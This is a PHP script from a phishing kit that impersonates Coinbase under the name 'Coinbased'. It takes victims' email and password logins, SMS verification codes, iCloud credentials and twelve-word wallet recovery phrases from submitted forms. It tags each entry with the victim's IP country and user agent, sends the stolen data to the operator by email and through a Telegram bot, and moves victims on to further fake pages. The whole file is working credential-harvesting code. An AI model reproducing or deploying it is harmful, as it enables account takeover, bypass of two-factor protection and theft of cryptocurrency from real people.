<?php
session_start();
error_reporting(0);
require('./main.php');
/* Some shits */
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$country = visitor_country();
function visitor_country(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

function tm($token,$userid,$data){
    $website="https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$userid."&text=" . urlencode($data)."";
    $ch = curl_init($website);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
/**/

$s = $_SERVER['HTTP_USER_AGENT'];
$dt=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$hn = gethostbyaddr($ip);
$cn = visitor_country();

if  ($_POST['email']){
    $msg="[ Coinbased - Log ^^ ]\n";
    $msg.="[ Email : ".$_POST['email']." ]\n";
    $msg.="[ Password : ".$_POST['password']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
   
    mail($email,"Coinbased - Log ^^".$_POST['email'],$msg,$headers);
    tm($token,$userid,$msg);
    
}elseif  ($_POST['passworder']){
    $msg="[ Coinbased - Log correct ^^ ]\n";
    $msg.="[ Email : ".$_POST['emailer']." ]\n";
    $msg.="[ Password : ".$_POST['passworder']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - Log correct ^^".$_POST['passworder'],$msg,$headers);
    tm($token,$userid,$msg);
	
}elseif  ($_POST['token']){
    $msg="[ Coinbased - SMS 1 ^^ ]\n";
    $msg.="[ SMS C0de : ".$_POST['token']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - SMS 1 ^^".$_POST['token'],$msg,$headers);
    tm($token,$userid,$msg);
    
}elseif  ($_POST['tokenn']){
    $msg="[ Coinbased - SMS 2 ^^ ]\n";
    $msg.="[ SMS C0de : ".$_POST['tokenn']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - SMS 1 ^^".$_POST['tokenn'],$msg,$headers);
    tm($token,$userid,$msg);

}elseif  ($_POST['iemail']){
    $msg="[ Coinbased - iCloud 1 ^^ ]\n";
    $msg.="[ Email : ".$_POST['iemail']." ]\n";
    $msg.="[ Password : ".$_POST['ipassword']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - iCloud 1 ^^".$_POST['iemail'],$msg,$headers);
    tm($token,$userid,$msg);
    header("location: ../login_error.php?cmd=".$_SESSION['PHPisHERE']);
    

}elseif  ($_POST['iemailn']){
    $msg="[ Coinbased - iCloud 2 ^^ ]\n";
    $msg.="[ Email : ".$_POST['iemailn']." ]\n";
    $msg.="[ Password : ".$_POST['ipasswordn']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - iCloud 2 ^^".$_POST['iemailn'],$msg,$headers);
    tm($token,$userid,$msg);
    header("location: ../sms_confirmation.php?cmd=".$_SESSION['PHPisHERE']);

}elseif  ($_POST['iSms']){
    $msg="[ Coinbased - iCloud SMS 1 ^^ ]\n";
    $msg.="[ SMS C0de : ".$_POST['iSms']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - iCloud SMS 1 ^^".$_POST['iSms'],$msg,$headers);
    tm($token,$userid,$msg);
    header("location: ../sms_confirmation_error.php?cmd=".$_SESSION['PHPisHERE']);

}elseif  ($_POST['iSms2']){
    $msg="[ Coinbased - iCloud SMS 2 ^^ ]\n";
    $msg.="[ SMS C0de : ".$_POST['iSms2']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - iCloud SMS 2 ^^".$_POST['iSms2'],$msg,$headers);
    tm($token,$userid,$msg);
    header("location: ../process2.php?cmd=".$_SESSION['PHPisHERE']);
    
}elseif  ($_POST['1']){
    $msg="[ Coinbased - Phrase ^^ ]\n";
    $msg.="[ Phrase : ".$_POST['1'].' '.$_POST['2'].' '.$_POST['3'].' '.$_POST['4'].' '.$_POST['5'].' '.$_POST['6'].' '.$_POST['7'].' '.$_POST['8'].' '.$_POST['9'].' '.$_POST['10'].' '.$_POST['11'].' '.$_POST['12']." ]\n";
    $msg.= "[ User Agent : ".$s."\n";
    $msg.= "[ Country : ".$cn."\n";
    $msg.= "[ Date: ".$dt."\n";
    $headers = "From: Coinbased <castalia@dolphin.fg>"."\n";
    
    mail($email,"Coinbased - Phrase ^^",$msg,$headers);
    tm($token,$userid,$msg);
    header("location: ../process2.php?cmd=".$_SESSION['PHPisHERE']);
}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}